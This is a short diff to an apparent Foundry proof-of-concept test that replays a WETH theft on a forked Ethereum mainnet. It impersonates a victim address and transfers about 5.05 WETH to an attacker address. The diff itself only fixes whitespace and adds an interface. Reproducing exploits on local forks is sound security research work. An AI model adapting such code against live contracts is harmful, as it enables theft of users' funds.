@@ -27,7 +27,7 @@ contract ContractTest is Test {
     function setUp() public {
         vm.createSelectFork("mainnet", 20738427);
     }
-    
+
     function testPoC() public {
         emit log_named_decimal_uint("before attack: balance of attacker", IERC20(weth9).balanceOf(attacker), 18);
         vm.startPrank(addr2);
@@ -37,4 +37,10 @@ contract ContractTest is Test {
         IWETH9(weth9).transferFrom(addr2, attacker, 5049899842444876795);
         emit log_named_decimal_uint("after attack: balance of attacker", IERC20(weth9).balanceOf(attacker), 18);
     }
+}
+
+interface IWETH9 {
+    function approve(address, uint256) external returns (bool);
+    function transferFrom(address, address, uint256) external returns (bool);
+    function balanceOf(address) external view returns (uint256);
 }
